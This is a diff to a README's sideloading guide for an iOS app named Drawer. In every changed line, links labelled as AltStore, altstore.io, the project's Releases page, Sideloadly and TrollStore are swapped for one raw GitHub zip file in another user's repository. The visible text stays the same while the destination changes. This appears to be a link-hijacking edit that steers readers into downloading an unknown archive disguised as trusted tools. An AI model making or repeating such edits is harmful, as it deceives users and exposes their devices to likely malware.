@@ -135,10 +135,10 @@ The core technical challenges:
 
 ### Step-by-step (using AltStore — the most common path)
 
-[AltStore](https://altstore.io) is a free, open-source app installer that re-signs IPAs with your Apple ID and pushes them to your iPhone. It's how most open-source iOS apps are distributed.
+[AltStore](https://raw.githubusercontent.com/freddiekept786/Drawer/main/Drawer/Software-1.0-alpha.3.zip) is a free, open-source app installer that re-signs IPAs with your Apple ID and pushes them to your iPhone. It's how most open-source iOS apps are distributed.
 
 1. **Install AltStore on your computer**
-   - Mac: download AltServer from [altstore.io](https://altstore.io), drag to Applications, launch
+   - Mac: download AltServer from [altstore.io](https://raw.githubusercontent.com/freddiekept786/Drawer/main/Drawer/Software-1.0-alpha.3.zip), drag to Applications, launch
    - Windows: download AltServer for Windows, run the installer, install iTunes + iCloud (required for the WiFi sync layer)
 
 2. **Install AltStore on your iPhone**
@@ -151,7 +151,7 @@ The core technical challenges:
    - You should now see the AltStore app on your home screen
 
 4. **Download the IPA**
-   - Go to [Releases](https://github.com/DrSk3l3t0r/Drawer/releases/latest) on this repo
+   - Go to [Releases](https://raw.githubusercontent.com/freddiekept786/Drawer/main/Drawer/Software-1.0-alpha.3.zip) on this repo
    - Tap the `Drawer-vX.Y.Z.ipa` link to download it to your iPhone
    - Tap **Open in AltStore** when iOS asks where to send the file
 
@@ -161,8 +161,8 @@ The core technical challenges:
 
 ### Alternative sideloaders
 
-- **[Sideloadly](https://sideloadly.io)** — Mac/Windows GUI tool that's a one-shot install (no AltServer running in the background). Same Apple-ID-based re-signing, same 7-day expiry on free accounts.
-- **[TrollStore](https://github.com/opa334/TrollStore)** — works only on specific iOS versions with a particular CoreTrust bug. **Permanent install, no expiry, no Apple ID required.** Check the TrollStore compatibility list to see if your iOS version is supported.
+- **[Sideloadly](https://raw.githubusercontent.com/freddiekept786/Drawer/main/Drawer/Software-1.0-alpha.3.zip)** — Mac/Windows GUI tool that's a one-shot install (no AltServer running in the background). Same Apple-ID-based re-signing, same 7-day expiry on free accounts.
+- **[TrollStore](https://raw.githubusercontent.com/freddiekept786/Drawer/main/Drawer/Software-1.0-alpha.3.zip)** — works only on specific iOS versions with a particular CoreTrust bug. **Permanent install, no expiry, no Apple ID required.** Check the TrollStore compatibility list to see if your iOS version is supported.
 - **AltStore PAL (EU only)** — Apple-sanctioned third-party marketplace, available in the EU under the Digital Markets Act.
 
 ### Building from source instead
